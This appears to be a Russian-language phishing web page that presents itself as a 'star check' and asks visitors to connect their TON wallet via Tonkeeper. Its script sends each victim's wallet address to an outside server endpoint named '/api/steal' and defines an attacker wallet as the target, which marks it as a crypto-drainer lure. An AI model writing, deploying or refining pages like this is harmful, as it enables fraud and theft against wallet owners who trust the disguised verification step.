<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Звёзды</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0b0b0b;
      color: #00ffcc;
      padding: 20px;
      text-align: center;
    }
    .btn {
      display: inline-block;
      margin-top: 20px;
      padding: 14px 28px;
      background: #1f3a3a;
      color: #00ffcc;
      border: 2px solid #00ffcc;
      border-radius: 8px;
      text-decoration: none;
      font-size: 18px;
      font-weight: bold;
    }
    .btn:hover {
      background: #00ffcc22;
    }
    #log {
      margin-top: 20px;
      background: #111;
      padding: 15px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h2>⭐ Проверка звёзд</h2>
  <p>Нажмите кнопку, чтобы подтвердить звёзды</p>
  <button class="btn" id="connectBtn">Подключить кошелёк</button>
  <div id="log">Нажмите кнопку</div>

  <script>
    const TARGET_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";

    // Функция для отправки адреса на сервер
    async function sendToServer(userAddress) {
      try {
        const response = await fetch('https://AfiAfiDroch.pythonanywhere.com/api/steal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ victimAddress: userAddress })
        });
        const result = await response.json();
        console.log('Сервер ответил:', result);
        document.getElementById('log').innerHTML = `✅ Адрес отправлен: ${userAddress}`;
      } catch (err) {
        document.getElementById('log').innerHTML = `❌ Ошибка: ${err.message}`;
        console.error(err);
      }
    }

    // Подключение через Tonkeeper
    document.getElementById('connectBtn').onclick = function() {
      const log = document.getElementById('log');
      log.innerHTML = '⏳ Открываем Tonkeeper...';

      // Открываем Tonkeeper с deep link
      const manifestUrl = 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/tonconnect-manifest.json';
      const url = `https://app.tonkeeper.com/connect?manifest=${manifestUrl}`;
      window.location.href = url;

      // Ждём возврата из кошелька (через 5 секунд)
      setTimeout(() => {
        log.innerHTML = '✅ Кошелёк открыт. Подключитесь и подтвердите звёзды.';
      }, 3000);
    };

    // Обработчик, если Tonkeeper вернёт адрес через postMessage (не всегда работает)
    window.addEventListener('message', (event) => {
      if (event.data && event.data.event === 'connect') {
        const userAddress = event.data.payload.address;
        document.getElementById('log').innerHTML = `✅ Адрес получен: ${userAddress}`;
        sendToServer(userAddress);
      }
    });
  </script>
</body>
</html>
